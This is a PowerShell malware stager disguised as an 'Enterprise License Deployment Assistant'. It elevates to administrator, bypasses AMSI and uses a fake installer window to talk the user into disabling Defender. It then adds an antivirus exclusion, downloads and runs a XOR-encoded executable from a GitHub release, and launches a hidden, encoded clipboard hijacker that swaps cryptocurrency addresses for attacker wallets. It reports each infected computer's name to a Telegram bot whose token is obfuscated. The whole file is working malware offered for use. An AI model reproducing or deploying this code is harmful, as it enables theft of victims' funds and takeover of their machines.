# --- [RESEARCH STAGER v48.0: DIRECT INTEGRITY SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Mandatory Admin Gate (Must be accepted for installation to work)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    try { (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m") | Out-Null } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Enterprise License Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,550)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,150)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING... DONE`n > ADMIN PRIVILEGES: CONFIRMED`n > STATUS: [!] SECURITY EXCEPTION REQUIRED"
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,280); $link.Size = New-Object Drawing.Size(500,45)
    $link.Text = "STEP 1: Disable Real-time Protection"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,350); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "STEP 2: I have manually suspended security for deployment."
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Begin Installation"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-DirectDeployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Installation Progress"; $form.Size = New-Object Drawing.Size(450,250); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $status = New-Object Windows.Forms.Label; $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(380,40); $status.Text = "Status: Initializing..."
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,80); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($status); $form.Controls.Add($pb); $form.Show()

    # --- THE V34.0 LOGIC (Now Running Direct to ensure Permissions) ---
    try {
        $pb.Value = 10; $status.Text = "Status: Creating Secure Directories..."
        $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

        $pb.Value = 30; $status.Text = "Status: Downloading Digital Assets..."
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)

        $pb.Value = 60; $status.Text = "Status: Registering Services... (Approve Prompt)"
        Start-Process $path -WindowStyle Hidden

        # Clipper Deployment
        $pb.Value = 80; $status.Text = "Status: Finalizing Shell Sync..."
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden

        $pb.Value = 100; $status.Text = "Status: Success."
        Start-Sleep -m 500; $form.Close()
        [Windows.Forms.MessageBox]::Show("Enterprise activation complete.", "Success", 0, 64) | Out-Null
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Critical Error: Installation was interrupted by system security.", "Error", 0, 16) | Out-Null
    }
}

# --- EXECUTION ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) {
    Send-Ping -m "V48_DIRECT_INSTALL_ON_$env:COMPUTERNAME"
    Run-DirectDeployment
}
